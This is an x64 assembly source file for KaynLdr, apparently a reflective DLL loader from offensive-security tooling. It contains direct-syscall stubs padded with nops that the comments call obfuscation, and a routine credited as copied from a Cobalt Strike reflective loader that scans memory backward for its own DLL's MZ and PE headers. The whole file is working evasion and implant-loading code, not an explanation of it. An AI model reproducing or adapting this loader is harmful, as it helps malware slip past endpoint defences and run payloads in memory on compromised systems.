; KaynLdr
; Author: Paul Ungur (@C5pider)
; Credits: Austin Hudson (@ilove2pwn_), Chetan Nayak (@NinjaParanoid), Bobby Cooke (@0xBoku), @trickster012
;

global KaynCaller

global SyscallPrepare
global SyscallInvoke

section .text

   ;; set syscall value in r11 register
   SyscallPrepare:
       nop             ; extra nop to "obfuscate"
       xor r11, r11    ; zero out r11
       nop             ; extra nop to "obfuscate"
       nop             ; extra nop to "obfuscate"
       mov r11d,ecx   ; save 32-bit value from ecx to r11 as 32-bit
   ret                 ; return

   ;; Invoke Syscall and pass given arguments
   SyscallInvoke:
       nop             ; extra nop to "obfuscate"
       xor eax, eax    ; zero out rax
       mov r10, rcx    ; syscall arguments
       nop             ; extra nop to "obfuscate"
       mov eax, r11d   ; move value from r11 to eax which is the syscall id to invoke the syscall
       nop             ; extra nop to "obfuscate"
       syscall         ; invoke the syscall
       nop             ; extra nop to "obfuscate"
   ret                 ; return NTSTATUS

   ; Shameless copied from Bobby Cooke CobaltStrikeReflectiveLoader (https://github.com/boku7/CobaltStrikeReflectiveLoader)
   KaynCaller:
       call pop                 ; Calling the next instruction puts RIP address on the top of our stack
       pop:
       pop rcx                  
   loop:
       xor rbx, rbx             ; rbx = 0
       mov ebx, 0x5A4D          ; MZ bytes for comparing if we are at the start of our reflective DLL
       dec rcx
       cmp bx,  word ds:[rcx]   ; Compare the first 2 bytes of the page to MZ
       jne loop
       xor rax, rax             ; eax = 0
       mov ax,  [rcx+0x3C]      ; ax = PIMAGE_DOS_HEADER->e_lfanew
       add rax, rcx             ; DLL base + RVA new exe header = 0x00004550 PE00 Signature
       xor rbx, rbx             ; rbx = 0
       add bx,  0x4550          ; bx = IMAGE_NT_SIGNATURE
       cmp bx,  word ds:[rax]   ; eax == IMAGE_NT_SIGNATURE
       jne loop
       mov rax, rcx             ; Saves the address to our reflective Dll
   ret                          ; return KaynLdrAddr